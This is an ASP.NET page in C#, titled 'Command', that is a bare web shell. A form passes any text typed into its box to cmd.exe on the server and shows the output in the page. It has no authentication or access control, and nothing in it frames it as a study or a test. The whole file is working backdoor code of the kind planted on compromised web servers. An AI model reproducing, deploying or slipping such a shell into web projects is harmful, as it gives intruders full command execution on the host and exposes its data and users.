<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

    <script runat="server">

        protected void Page_Load(object sender, EventArgs e)
        {
        }

        protected void btnExecute_Click(object sender, EventArgs e)
        {
            litResponse.Text = Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text));
            responsePanel.Visible = true;
        }
        
        private string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.FileName = "cmd.exe";
                processStartInfo.Arguments = "/c " + command;
                processStartInfo.RedirectStandardOutput = true;
                processStartInfo.UseShellExecute = false;

                Process process = Process.Start(processStartInfo);
                using (StreamReader streamReader = process.StandardOutput)
                {
                    string ret = streamReader.ReadToEnd();
                    return ret;
                }
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }
        }
    </script>  

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <title>Command</title>
</head>
<body>
    <form id="formCommand" runat="server">
    <div>
        <table>
            <tr>
                <td width="30">Command:</td>
                <td><asp:TextBox ID="txtCommand" runat="server" Width="820px"></asp:TextBox></td>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="btnExecute" runat="server" OnClick="btnExecute_Click" Text="Execute" /></td>
            </tr>
        </table>
    </div>    
    </form>
    <asp:Panel ID="responsePanel" runat="server" Visible="false">
        <pre><asp:Literal ID="litResponse" runat="server"></asp:Literal></pre>
    </asp:Panel>      
</body>
</html>
